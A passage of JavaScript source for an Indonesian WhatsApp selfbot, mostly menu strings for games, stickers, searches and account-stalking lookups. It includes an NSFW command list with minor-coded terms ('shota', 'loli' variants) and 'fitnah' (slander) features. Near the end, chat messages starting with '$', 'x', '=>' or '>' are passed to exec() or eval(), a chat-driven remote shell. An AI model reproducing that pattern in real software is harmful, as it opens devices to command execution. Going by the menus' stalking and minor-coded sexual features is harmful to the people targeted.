_menebak bendera negara_
Aliases : -
Example : *.tebakbendera*

9. *${prefix}kimiakuis*
_anak ipa_
Aliases : -
Example : *.kimiakuis*

10. *${prefix}tebakjenaka*
_fun_
Aliases : -
Example : *.tebakjenaka*

11. *${prefix}susunkata*
_fun_
Aliases : -
Example : *.susunkata*

12. *${prefix}tebaklirik*
_tebak lirik lagu_
Aliases : -
Example : *.tebaklirik*

13. *${prefix}asahotak*
_otak anda di asah lagi_
Aliases : -
Example : *.asahotak*
`)
break

case '🛍️':
if (isBanned) return reply(mess.ban)
reply(`━━━ *「* *OTHER MENU* *」* ━━━
 
1. *${prefix}get*
_Masukan link_
Aliases : -
Usage : *${prefix}get*

2.️ *${prefix}artinama*
_Masukan nama artikan_
Aliases : -
Usage : *${prefix}artinama*

3.️ *${prefix}jadian*
_tebak siapa jadian_
Aliases : -
Usage : *${prefix}jadian*

4.️ *${prefix}truth*
_Permainan_
Aliases : -
Usage :  *${prefix}truth*

5. *${prefix}dare*
_Permainan_
Aliases : -
Usage : *${prefix}dare*

6.️ *${prefix}dadu*
_Permainan_
Aliases : -
Usage : *${prefix}dadu*

7.️ *${prefix}slot*
_Permainan_
Aliases : -
Usage : *${prefix}slot*

8. *${prefix}meme*
_Image meme_
Aliases : -
Usage : *${prefix}meme*

9.️ *${prefix}sharelock*
_Masukan teks sharelock_
Aliases : -
Usage : *${prefix}sharelock sini*

10.️ *${prefix}cerpen*
_Cerita Pendek_
Aliases : -
Usage : *${prefix}cerpen*
`)
break

case '🎁':
if (isBanned) return reply(mess.ban)
reply(`
━━━ 「 *EPHOTO 360* 」 ━━━

• ${prefix}golden <teks>
• ${prefix}flower <teks>
• ${prefix}wooden <teks>
• ${prefix}burn <teks>
• ${prefix}glow <teks>
• ${prefix}summer <teks>
• ${prefix}neon <teks>
• ${prefix}coffeecup <teks>
• ${prefix}coffeecup2 <teks>
• ${prefix}battlefield <teks>|<teks>
• ${prefix}googletxt2 <teks>|<teks>
• ${prefix}transformer <teks>|<teks>
• ${prefix}write <teks>
• ${prefix}waifu <teks>
• ${prefix}phlogo <teks>|<teks>
• ${prefix}tfire <teks>
• ${prefix}phcomment <teks>|<teks>
• ${prefix}wolf <teks>
• ${prefix}ytgol <teks>
• ${prefix}ytsilver <teks>
• ${prefix}t3d <teks>
• ${prefix}logoa <teks>|<teks>
• ${prefix}marvel <teks>|<teks>
• ${prefix}leavest <teks>
• ${prefix}neon2 <teks>
• ${prefix}wall <teks>
• ${prefix}notewrite <teks>
• ${prefix}pubglogo <teks>|<teks>
`)
break

case '💳':
if (isBanned) return reply(mess.ban)
reply(`
━━━「 *EXP & LIMIT* 」━━━
 
1. *${prefix}buylimit*
_Kirim perinrah buylimit jumlah_
Aliases : -
Usage : *${prefix}buylimit 10*

2.️ *${prefix}levelup*
_Naikan level mu pekok_
Aliases : -
Usage : *${prefix}levelup*

3.️ *${prefix}claim*
_Ntah ini apa_
Aliases : -
Usage : *${prefix}claim*

4.️ *${prefix}limit*
_Ngecek limit gblok lu_
Aliases : -
Usage :  *${prefix}limit*

4.️ *${prefix}mancing*
_Memancing ikan awowkwok_
Aliases : -
Usage :  *${prefix}mancing*

5. *${prefix}joinrpg*
_Join rpg_
Aliases : -
Usage : *${prefix}joinrpg*

6.️ *${prefix}rpgmenu*
_Rpgmu beb_
Aliases : -
Usage : *${prefix}rpgmenu*

7.️ *${prefix}leaderboard*
_Database lb_
Aliases : -
Usage : *${prefix}lb*

8.️ *${prefix}adventure*
_Nguli dumlu_
Aliases : -
Usage :  *${prefix}adventure*

9.️ *${prefix}mining*
_Mencari uang awowkwok_
Aliases : -
Usage :  *${prefix}mining*

10.️ *${prefix}myinventori*
_My punyaku chek_
Aliases : -
Usage :  *${prefix}myinventori*
`)
break

case '☘️':
if (isBanned) return reply(mess.ban)
reply(`
━━━ 「 *MENU FUN* 」 ━━━

1. *${prefix}fitnah*
_fitnah_
Aliases : -
Example : *.fitnah (@tag)*

2. *${prefix}fitnahpc*
_fitnah_
Aliases : -
Example : *.kbbi (62xxx)*

3. *${prefix}kontak*
_kontak_
Aliases : -
Example : *.kontak (0|1)*

4. *${prefix}lolivod*
_loli_
Aliases : -
Example : -

5. *${prefix}toxic*
_why_
Aliases : -
Example : -

6. *${prefix}bucin*
_why_
Aliases : -
Example : *.bucin*

7. *${prefix}pantun*
_pantun_
Aliases : -
Example : -

8. *${prefix}dadu*
_dadi_
Aliases : -
Example : -

9. *${prefix}asupan*
_4sehat 5asupan_
Aliases : -
Example : -

10. *${prefix}hbd*
_supres_
Aliases : -
Example : -
`)
break

case '🫂':
if (isBanned) return reply(mess.ban)
reply(`
━━━ 「 *STALK MENU* 」 ━━━

1. *${prefix}igstalk*
_stalk akun ig orang_
Aliases : -
Example : *.igstalk (username)*

2. *${prefix}twitterstalk*
_stalk aun twitter_
Aliases : -
Example : *.twiterrstalk (username)*

3. *${prefix}githubstalk*
_stalk akun github_
Aliases : -
Example : *.githubstalk (username)*

4. *${prefix}tiktokstalk*
_stalk akun tiktod_
Aliases : -
Example : *.tiktokstalk (username)*

5. *${prefix}iguser*
_cari akun ig_
Aliases : -
Example : *.iguser (username)*
`)
break

case '🔖':
if (isBanned) return reply(mess.ban)
reply(`
━━━ *「* *ASUPAN MENU* *」* ━━━
 
1. *${prefix}asupan*
_Random Asupan_
Aliases : -
Usage : *${prefix}asupan*

2.️ *${prefix}asupanloli*
_Random Asupan_
Aliases : -
Usage : *${prefix}asupanloli*

3.️ *${prefix}asupangeayubi*
_Random Asupan_
Aliases : -
Usage : *${prefix}asupangeayubi*

4.️ *${prefix}asupanaura*
_Random Asupan_
Aliases : -
Usage :  *${prefix}asupanaura*

5. *${prefix}asupanbunga*
_Random Asupan_
Aliases : -
Usage : *${prefix}asupanbunga*

6.️ *${prefix}asupanayu*
_Random Asupan_
Aliases : -
Usage : *${prefix}asupanayu*

7.️ *${prefix}asupancaca*
_Random Asupan_
Aliases : -
Usage : *${prefix}asupancaca*

8. *${prefix}xnxx*
_Random Asupan_
Aliases : -
Usage : *${prefix}xnxx link*
`)
break

case '🔞':
if (isBanned) return reply(mess.ban)
reply(`
━━━ 「 *NSFW COMAND* 」 ━━━

• ${prefix}yuri (limit)
• ${prefix}hentai (limit)
• ${prefix}anal (limit)
• ${prefix}eroneko (limit)
• ${prefix}lesbian (limit)
• ${prefix}kitsune (limit)
• ${prefix}bj (limit)
• ${prefix}pussy (limit)
• ${prefix}wallpaper (limit)
• ${prefix}neko2 (limit)
• ${prefix}baka (limit)
• ${prefix}slap (limit)
• ${prefix}poke (limit)
• ${prefix}keta (limit)
• ${prefix}awoo (limit)
• ${prefix}blowjob (limit)
• ${prefix}megumin (limit)
• ${prefix}neko (limit)
• ${prefix}trapnime (limit)
• ${prefix}art (limit)
• ${prefix}bts (limit)
• ${prefix}exo (limit)
• ${prefix}elf (limit)
• ${prefix}shota (limit)
• ${prefix}shinobu (limit)
• ${prefix}megumin (limit)
• ${prefix}wallnime (limit)
• ${prefix}chiisaihentai (limit)
• ${prefix}blowjob (limit)
• ${prefix}yaoi (limit)
• ${prefix}ecchi (limit)
• ${prefix}ahegao (limit)
• ${prefix}hololewd (limit)
• ${prefix}sideoppai (limit)
• ${prefix}animefeets (limit)
• ${prefix}animebooty (limit)
• ${prefix}animethighss (limit)
• ${prefix}hentaiparadise (limit)
• ${prefix}animearmpits (limit)
• ${prefix}hentaifemdom (limit)
• ${prefix}lewdanimegirls (limit)
• ${prefix}biganimetiddies (limit)
• ${prefix}animebellybutton (limit)
• ${prefix}hentai4everyone (limit)
• ${prefix}ero (limit)
• ${prefix}cum (limit)
• ${prefix}feet (limit)
• ${prefix}lewd (limit)
• ${prefix}feed (limit)
• ${prefix}eron (limit)
• ${prefix}solo (limit)
• ${prefix}gasm (limit)
• ${prefix}poke (limit)
• ${prefix}holo (limit)
• ${prefix}tits (limit)
• ${prefix}kuni (limit)
• ${prefix}kiss (limit)
• ${prefix}erok (limit)
• ${prefix}smug (limit)
• ${prefix}baka (limit)
• ${prefix}solog (limit)
• ${prefix}feetg (limit)
• ${prefix}lewdk (limit)
• ${prefix}femdom (limit)
• ${prefix}cuddle (limit)
• ${prefix}eroyuri (limit)
• ${prefix}cum_jpg (limit)
• ${prefix}blowjob (limit)
• ${prefix}erofeet (limit)
• ${prefix}holoero (limit)
• ${prefix}classic (limit)
• ${prefix}erokemo (limit)
• ${prefix}fox_girl (limit)
• ${prefix}futanari (limit)
• ${prefix}lewdkemo (limit)
• ${prefix}wallpaper (limit)
• ${prefix}pussy_jpg (limit)
• ${prefix}kemonomimi (limit)
• ${prefix}nsfw_avatar (limit)
• ${prefix}ngif (limit)
`)
break

case '👤':
if (isBanned) return reply(mess.ban)
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Untuk *Owner* Bot')
reply(`
━━━「 *OWNER MENU* 」━━━
 
1. *${prefix}off*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}off*

2.️ *${prefix}on*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}on*

3.️ *${prefix}isbaileys*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}isbaileys*

4.️ *${prefix}banchat*
_Hanya untuk ownerku_
Aliases : -
Usage :  *${prefix}banchat*

5. *${prefix}setcmd*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}setcmd*

6.️ *${prefix}restart*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}restart*

7.️ *${prefix}anticall*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}anticall*

8. *${prefix}autoread*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}autoread*

9.️ *${prefix}getcaption*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}getcaption*

10.️ *${prefix}autovn*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}autovn*

11.️ *${prefix}tovirgam*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}tovirgam*

12.️ *${prefix}cekapikey*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}cekapikey*

13. *${prefix}bc*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}bc*

14.️ *${prefix}addprem*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}addprem*

15.️ *${prefix}setthumb*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}setthumb*

16.️ *${prefix}settarget*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}settarget*

17.️ *${prefix}setfakeimg*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}setfakeimg*

19.️ *${prefix}setreply*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}setreply*

20. *${prefix}setprefix*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}setprefix*

21.️ *${prefix}mode*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}mode publik/self*

22. *${prefix}term <code>*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}term <code>*

23.️ *${prefix}eval <code>*
_Hanya untuk ownerku_
Aliases : -
Usage : *${prefix}eval <code>*
`)
break

case '🚨':
if (isBanned) return reply(mess.ban)
reply(`━━━ 「 *SEARCHING* 」 ━━━

1. *${prefix}kbbi*
_Kbbi_
Aliases : -
Example : *.kbbi (query)*

2. *${prefix}jarak*
_Jarak satu tempat ke tempat lain_
Aliases : -
Example : *.jarak (tempat|tempat)*

3. *${prefix}translate*
_Terjemah_
Aliases : -
Example : *.translate (teks)*

4. *${prefix}infogempa*
_BMKG_
Aliases : -
Example : -

5. *${prefix}covidindo*
_info covid di Indonesia_
Aliases : -
Example : -

6. *${prefix}covidglobal*
_info covid di dunia_
Aliases : -
Example : -

7. *${prefix}wikipedia*
_ensiklopedia_
Aliases : -
Example : *.wikipedia moksa*

8. *${prefix}playstore*
_Mencari apk di PlayStore_
Aliases : -
Example : *.playstore epepburik*

9. *${prefix}wattpad*
_ini gatau saya_
Aliases : -
Example : -

10. *${prefix}newsinfo*
_Berita_
Aliases : -
Example : -

11. *${prefix}jadwaltv*
_jadwal siaran tv_
Aliases : -
Example : -

12. *${prefix}cuaca*
_peramal_
Aliases : -
Example : -

13. *${prefix}google*
_cari apa gitu_
Aliases : -
Example : *.google nodejs*

14. *${prefix}gimage*
_cari gambar di google_
Aliases : -
Example : *.gimage kediri*

15. *${prefix}carigc*
_cari grup wa_
Aliases : -
Example : -

16. *${prefix}shopee*
_cari produk_
Aliases : -
Example : -

17. *${prefix}lk21*
_gatau saya coba aja_
Aliases : -
Example : -

18. *${prefix}ytsearch*
_cari judul yt_
Aliases : -
Example : -

19. *${prefix}webtonsearch*
_play masukan judul wibu_
Aliases : -
Usage : *${prefix}webtonsearch*

20.️ *${prefix}drakor*
_Masukan judul drakor_
Aliases : -
Usage : *${prefix}drakor*

21.️ *${prefix}animesearch*
_Masukan judul anime_
Aliases : -
Usage : *${prefix}animesearch*

22.️ *${prefix}character*
_Masukan judul karakter_
Aliases : -
Usage :  *${prefix}character*

23.️ *${prefix}film*
_Masukan judul Flm nya_
Aliases : -
Usage : *${prefix}film*`)
break


case '⏳':
if (isBanned) return reply(mess.ban)
reply(`
━━━ 「 *CONVERT MENU* 」 ━━━

1. *${prefix}tomp3*
_kirim perintah tomp3 reply vedeo tod_
Aliases : -
Usage : *${prefix}tomp3*

2.️ *${prefix}tomp4*
_kirim perintah tomp4 reply sticker tod_
Aliases : -
Usage : *${prefix}tomp4*

3.️ *${prefix}toimg*
_kirim perintah tomp4 reply sticker tod_
Aliases : -
Usage : *${prefix}toimg*

4. *${prefix}tovn*
_kirim perintah tovn reply audio tod_
Aliases : -
Usage : *${prefix}tovn*

5. *${prefix}tourl*
_kirim perintah tourl reply gambar tod_
Aliases : -
Usage : *${prefix}tourl*

6.️ *${prefix}slow*
_kirim perintah slow reply audio/vn tod_
Aliases : -
Usage : *${prefix}slow*

7. *${prefix}fast*
_kirim perintah fast reply audio/vn tod_
Aliases : -
Usage : *${prefix}fast*
`)
break


case '🎵':
if (isBanned) return reply(mess.ban)
reply(`━━━ 「 *SOUND* 」 ━━━

1. *${prefix}sound1*
_Musik ke 1_
Aliases : -
Example : -

2. *${prefix}sound2*
_Musik ke 2_
Aliases : -
Example : -

3. *${prefix}sound3*
_Musik ke 3_
Aliases : -
Example : -

4. *${prefix}sound4*
_Musik ke 4_
Aliases : -
Example : -

5. *${prefix}sound5*
_Musik ke 5_
Aliases : -
Example : -
`)
break


case '👑':
if (isBanned) return reply(mess.ban)
reply(`━━━ 「 *ABOUT* 」 ━━━

1. *${prefix}rules*
_Rules menggunakan bot_
Aliases : -
Example : -

2. *${prefix}ping*
_kecepatan bot_
Aliases : -
Example : -

4. *${prefix}status*
_Status bot_
Aliases : -
Example : -

5. *${prefix}owner*
_Pemilik bot_
Aliases : -
Example : -

6. *${prefix}report*
_melaporkan bug bot_
Aliases : -
Example : *.report (keluhan)*

7. *${prefix}runtime*
_waktu bot berjalan
Aliases : -
Example : -

8. *${prefix}listgroup*
_Total grup bot_
Aliases : -
Example : -

9. *${prefix}sewa*
_Harga sewa bot_
Aliases : -
Example : -
`)
break


case '💵':
if (isBanned) return reply(mess.ban)
reply(`
━━━「 *PREMIUM MENU* 」━━━

1. *${prefix}tiktoknowm*
_Hanya untuk pengguna premium_
Aliases : -
Usage : *${prefix}tiktoknowm*

2.️ *${prefix}ytmp4*
_Hanya untuk pengguna premium_
Aliases : -
Usage : *${prefix}ytmp4*

3.️ *${prefix}playmp4*
_Hanya untuk pengguna premium_
Aliases : -
Usage : *${prefix}playmp4*

4. *${prefix}mediafire*
_Hanya untuk pengguna premium_
Aliases : -
Usage : *${prefix}mediafire*
`)
break


case '📂':
if (isBanned) return reply(mess.ban)
reply(`━━━ 「 *STICKER EDITING* 」 ━━━
 
1. *${prefix}telesticker*
_Masukan link telegeamstiker yang mau di donload_
Aliases : -
Usage : *${prefix}telesticker link telegramstiker*

2.️ *${prefix}stcmeme*
_Kirim perintah stcmeme teks_
Aliases : -
Usage : *${prefix}stcmeme gblok*

3.️ *${prefix}smeme*
_Kirim perintah smeme teks_
Aliases : -
Usage : *${prefix}smeme wibu*

4.️ *${prefix}stickerwm*
_membuat stiker pack name lu_
Aliases : -
Usage :  *${prefix}stickerwm nama&author*

5. *${prefix}semoji*
_Kirim perintah semoji pake emoji_
Aliases : -
Usage : *${prefix}semoji 😂*

6.️ *${prefix}attp*
_attp pake teks tolol_
Aliases : -
Usage : *${prefix}attp wibu*

7.️ *${prefix}attp2*
_attp2 pake teks tolol_
Aliases : -
Usage : *${prefix}attp wibu*

8. *${prefix}ttp*
_ttp pake teks lol_
Aliases : -
Usage : *${prefix}ttp lol*

9.️ *${prefix}ttp2*
_ttp2 pake teks lol_
Aliases : -
Usage : *${prefix}ttp2 lol*

10.️ *${prefix}ttp3*
_ttp3 pake teks lol_
Aliases : -
Usage : *${prefix}ttp3 lol*

11.️ *${prefix}ttp4*
_ttp4 pake teks lol_
Aliases : -
Usage : *${prefix}ttp4 lol*

12. *${prefix}sticker*
_Kirim gambar / vedeo dengan caption sticker_
Aliases : -
Usage : *${prefix}sticker*
`)
break


case '👥':
if (isBanned) return reply(mess.ban)
if (!isGroup) return reply('Fitur Ini hanya bisa di gunakan di dalam group')
reply(`━━━ 「 *GRUP MENU* 」 ━━━
 
1. *${prefix}grup*
_mau buka/tutup_
Aliases : -
Example : *.grup buka*

2.️ *${prefix}antilink*
_yang kirim link di kick_
Aliases : -
Example : *.antilink on*

3.️ *${prefix}antivirtex*
_Antivirtex grup_
Aliases : -
Example : *.antivirtex on*

4.️ *${prefix}setdesc*
_ganti deskripsi grup_
Aliases : -
Example :  *.setdesc (teks)*

5. *${prefix}listonline*
_siapa yg online di grup_
Aliases : -
Example : *.listonline*

6.️ *${prefix}getname*
_colong username member_
Aliases : -
Example : *.getname (@tag)*

7.️ *${prefix}getpic*
_colong pp member_
Aliases : -
Example : *.getpic (@tag)*

8. *${prefix}listsider*
_siapa yg sider di grup_
Aliases : -
Example : *.listsider (reply pesan bot)*

9.️ *${prefix}totag*
_Replt sticker/image_
Aliases : -
Example : *.totag*

10.️ *${prefix}setname*
_ganti nama grup_
Aliases : -
Example : *.setname (namagrup)*

11.️ *${prefix}hidetag*
_tag ga keliatan_
Aliases : -
Example : *.hidetag*

12.️ *${prefix}tagall*
_tag semua member_
Aliases : -
Example : *.tagall*

13. *${prefix}antihidetag*
_yg hidetag di kick_
Aliases : -
Example : *.antihidetag*`)
break

case '🌍':
if (isBanned) return reply(mess.ban)
reply(`
━━━「 *PRIMBON MENU* 」━━━

1. *${prefix}artinama*
_Artikan nama sesseorang_
Aliases : -
Usage : *${prefix}artinama*

2.️ *${prefix}zodiak*
_Meramal mu_
Aliases : -
Usage : *${prefix}zodiak*

3.️ *${prefix}wangy*
_Wangi sekali_
Aliases : -
Usage : *${prefix}wangy*`)
break
//------------------< Batas >-------------------

if (!mek.key.fromMe) return;
if (_chats.startsWith('$')){
if (!isOwner)return// reply(`Perintah ini tidak bisa Di lakukan oleh Jadibot sementara`)
if (!q)return 
var itsme = `${sender}`
var split = `*itsmevall-BotWeA*`
const term = {
contextInfo: {
participant: itsme,
quotedMessage: {
extendedTextMessage: {
text: split,
}
}
}
}
exec(q, (err, stdout) => {
if (err) return itsmevall.sendMessage(from, ` ${err}`, text, { quoted: mek })
if (stdout) {
itsmevall.sendMessage(from, stdout, text, term)
}
})
}

      default:
if (!mek.key.fromMe) return;
if (_chats.startsWith('$')){
if (!q)return 
var itsme = `${sender}`
var split = `*itsmevall-BotWeA*`
const term = {
contextInfo: {
participant: itsme,
quotedMessage: {
extendedTextMessage: {
text: split,
}
}
}
}
exec(q, (err, stdout) => {
if (err) return itsmevall.sendMessage(from, ` ${err}`, text, { quoted: mek })
if (stdout) {
itsmevall.sendMessage(from, stdout, text, term)
}
})
}      
      if (budy.startsWith('x')){
try {
return itsmevall.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('=>')){
if (!mek.key.fromMe && !isOwner && !isPremium) return reply('Perintah Ini hanya bisa di gunakan oleh *Owner*')
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color("=>", "green"), 'from', color(pushname), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
if (!mek.key.fromMe) return;
        if (_chats.startsWith(">")) {
          try {
            return itsmevall.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, "\t"),
              text,
              { quoted: mek }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
		if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Waktunya sahur kak, Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(😊)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(🙄)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi buka kak, Sabar ya kak', 'yellow'), color('(😆)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[Pesan Bot]', 'cyan'), color('Alhamdulillah, Dh magrib jan lupa sholat kak', 'yellow'), color('(😊)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 8 gak mabar kak?', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '02:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bot ngantuk kak, tidur dulu ya kak', 'yellow'), color('(😴)', 'white'))
        }

     if (!mek.key.fromMe) return;
        if (_chats.startsWith(">")) {
          try {
            return itsmevall.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, "\t"),
              text,
              { quoted: mek }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
    }

    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[SELFBOT]", "red"),
        "Created By ZyyXtrime",
        color(sender.split("@")[0])
      );
    }
   } catch (e) {
    e = String(e);// Fixed Di Consolog 🌹
    if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined") && !e.includes("Cannot read property 'key' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined")) {
      console.log("Message : %s", color(e, "yellow"));
    }
    // console.log(e)
  }
};
// CREATED BY ZyyXtrime